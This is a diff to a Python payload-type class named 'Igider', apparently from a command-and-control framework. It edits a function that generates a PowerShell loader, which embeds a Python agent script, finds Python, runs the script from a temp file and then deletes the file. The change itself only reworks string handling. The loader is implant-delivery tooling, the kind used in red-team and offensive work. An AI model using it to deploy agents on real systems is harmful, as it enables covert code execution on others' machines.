@@ -170,13 +170,13 @@ class Igider(PayloadType):
 
     def _create_powershell_loader(self, python_code: str) -> str:
         """Create PowerShell reflective loader for Python agent."""
-        # Base64 encode the Python code
-        encoded_code = base64.b64encode(python_code.encode()).decode()
+        # Clean the Python code to ensure proper formatting
+        # Remove any leading/trailing whitespace from each line to prevent issues with here-strings
+        cleaned_python_code = '\n'.join(line.rstrip() for line in python_code.split('\n'))
         
-        powershell_loader = f'''
-    # PowerShell Reflective Python Loader
+        powershell_loader = f'''# PowerShell Reflective Python Loader
     $pythonCode = @"
-    {python_code}
+    {cleaned_python_code}
     "@
 
     # Check for Python installation
@@ -218,8 +218,7 @@ class Igider(PayloadType):
         & $pythonExe $tempFile
     }} finally {{
         Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
-    }}
-    '''
+    }}'''
         return powershell_loader
     
 
